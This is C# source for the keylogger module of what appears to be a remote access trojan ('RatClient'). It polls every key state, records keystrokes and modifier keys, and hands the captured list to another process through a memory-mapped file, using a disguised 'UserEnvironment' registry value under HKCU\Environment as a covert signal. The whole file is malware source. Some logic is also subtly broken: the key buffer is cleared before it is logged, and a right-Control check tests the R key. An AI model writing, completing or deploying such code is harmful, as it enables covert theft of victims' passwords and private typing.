using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;
using System.Text.RegularExpressions;
using System.IO.MemoryMappedFiles;

namespace RatClient.KeyLogger
{
    class AcKeyLogger
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern short GetAsyncKeyState(int virtualKeyCode);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int GetKeyboardState(byte[] keystate);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MapVirtualKey(uint uCode, int uMapType);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);


        static bool SendData(RegistryKey subkey, List<string> listout)
        {
            MemoryMappedFile mmf;
            MemoryMappedViewAccessor view;
            if ((int)subkey.GetValue("UserEnvironment") == 12)
            {
                string res = string.Join(",", listout);
                byte[] result = Encoding.UTF8.GetBytes(res);
                try
                {
                    mmf = MemoryMappedFile.CreateNew("MMMFFF", result.Length);
                }
                catch
                {
                    return false;
                }
                view = mmf.CreateViewAccessor();
                view.WriteArray(0, result, 0, result.Length);
                view.Flush();
                view.Dispose();
                while ((int)subkey.GetValue("UserEnvironment") != 123)
                {
                    Thread.Sleep(40);
                }
                for (int n = 0; n < 5; n++)
                {
                    mmf.Dispose();
                }
                subkey.SetValue("UserEnvironment", 0, RegistryValueKind.DWord);
                return true;
            }
            return false;
        }

        public static void Start()
        {
            RegistryKey key;
            RegistryKey subkey;
            int state;
            StringBuilder virkey = new StringBuilder();
            List<string> listout = new List<string>();
            key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);
            subkey = key.OpenSubKey("Environment", true);


            while (true)
            {
                Thread.Sleep(40);
                for (int i = 0; i < 256; i++)
                {
                    state = GetAsyncKeyState(i);
                    if (state == -32767)
                    {
                        if ((GetAsyncKeyState((int)Keys.LShiftKey) & 0x8000) == 0x8000 || (GetAsyncKeyState((int)Keys.RShiftKey) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Shift}");
                        }
                        if ((GetAsyncKeyState((int)Keys.LControlKey) & 0x8000) == 0x8000 || (GetAsyncKeyState((int)Keys.R) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Ctrl}");
                        }
                        if ((GetAsyncKeyState((int)Keys.LMenu) & 0x8000) == 0x8000 || (GetAsyncKeyState((int)Keys.RMenu) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Alt}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Tab) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Tab}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Space) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{SpaceBar}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Delete) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Delete}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Return) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Enter}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Back) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Backspace}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Left) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Left Arrow}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Right) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Right Arrow}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Up) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Up Arrow}");
                        }
                        if ((GetAsyncKeyState((int)Keys.Down) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Down Arrow}");
                        }
                        if ((GetAsyncKeyState((int)Keys.LButton) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Left Mouse}");
                        }
                        if ((GetAsyncKeyState((int)Keys.RButton) & 0x8000) == 0x8000)
                        {
                            virkey.Append("{Right Mouse}");
                        }
                        if (Console.CapsLock)
                        {
                            virkey.Append("{Caps Lock}");
                        }
                        StringBuilder mychar = new StringBuilder();
                        int virtualKeyc = MapVirtualKey((uint)i, 3);
                        byte[] kbstate = new Byte[256];
                        int checkkbstate = GetKeyboardState(kbstate);
                        ToUnicode((uint)i, (uint)virtualKeyc, kbstate, mychar, mychar.Capacity, 0);
                        virkey.Append(mychar);
                        virkey.Clear();
                        if ((Regex.Matches(virkey.ToString(), "\\{").Count) > 1)
                        {
                            listout.RemoveAt(listout.Count - 1);
                        }
                        listout.Add(virkey.ToString());
                    }
                }
                if (SendData(subkey, listout))
                {
                    listout.Clear();
                }
                if (listout.Count > 1000000)
                {
                    listout.Clear();
                }
            }
        }
    
    }
}
